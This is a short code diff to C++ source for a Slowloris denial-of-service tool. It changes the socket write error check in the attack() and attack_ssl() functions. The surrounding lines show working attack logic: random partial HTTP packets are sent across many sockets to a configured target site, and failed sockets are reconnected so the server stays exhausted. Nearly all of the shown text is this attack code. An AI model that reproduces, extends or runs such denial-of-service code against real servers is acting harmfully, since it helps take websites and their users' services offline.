@@ -23,7 +23,7 @@ void Slowloris::attack(const int *id) {
                 keep_alive[x] = false;
             }
             const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
-            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) < 0){
+            if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(&sockets[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                 keep_alive[x] = false;
@@ -68,7 +68,7 @@ void Slowloris::attack_ssl(const int *id) {
                 keep_alive[x] = false;
             }
             const char *packet = Randomizer::randomPacket(conf, keep_alive[x]);
-            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) < 0){
+            if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
                 sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
                 CTXs[x] = InitCTX();
